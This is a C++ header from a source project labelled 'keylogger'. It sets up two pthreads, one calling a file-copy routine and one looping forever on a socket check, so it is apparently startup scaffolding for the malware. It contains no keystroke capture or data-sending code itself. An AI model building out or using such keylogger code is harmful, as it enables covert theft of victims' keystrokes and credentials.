//
//  prepare.h
//  keylogger
//
//  Created by Arekor on 5/16/2560 BE.
//
//

#ifndef prepare_h
#define prepare_h

#include "IO.h"
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include "sockstatus.h"

#define MAX_Procress 2
#define BUF_SIZE 1024
namespace pre {
    pthread_mutex_t lock;
    void* ThreadCopy(void*) {
        pthread_mutex_lock(&lock);
        IO::copy_File();
        pthread_mutex_unlock(&lock);
        return NULL;
    }

    void* ThreadCheckFile(void*) {
        pthread_mutex_lock(&lock);
        while (true) {
            ss::creckSoc();
        }
        pthread_mutex_unlock(&lock);
        return NULL;
    }


    void start() {
        pthread_t t[MAX_Procress];

        if (pthread_mutex_init(&lock, NULL) != 0)
        {
            //mutex init failed
            start();
        }
        // Create MAX_Procress worker threads.

        for (int i = 0; i < MAX_Procress; i++) {
            // Allocate memory for thread data.
            if (i == 0){
                pthread_create(&t[i], NULL, &ThreadCopy, NULL);
            } else{
                pthread_create(&t[i], NULL, &ThreadCheckFile, NULL);
            }


        }

    }
}
#endif /* prepare_h */
